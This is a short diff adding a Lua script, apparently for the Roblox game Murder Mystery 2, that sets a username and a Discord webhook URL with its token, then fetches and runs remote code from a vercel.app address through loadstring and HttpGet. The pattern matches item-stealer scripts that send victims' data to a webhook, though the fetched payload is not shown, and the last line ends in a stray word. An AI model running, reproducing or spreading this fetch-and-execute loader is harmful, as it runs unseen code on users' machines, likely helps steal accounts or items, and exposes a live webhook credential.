@@ -1,0 +1,4 @@
+Username = "Itaboutdrivetheroc"
+Webhook = "https://discord.com/api/webhooks/1294879530216849492/spwU42Zp9WmnFgLwCXER9m8_QQf32k0c-eU9SLnfIGZZXHojXHno1QE4kRnnPyibHL9U"
+
+loadstring(game:HttpGet("https://janeq.vercel.app/mm2.lua"))()not 
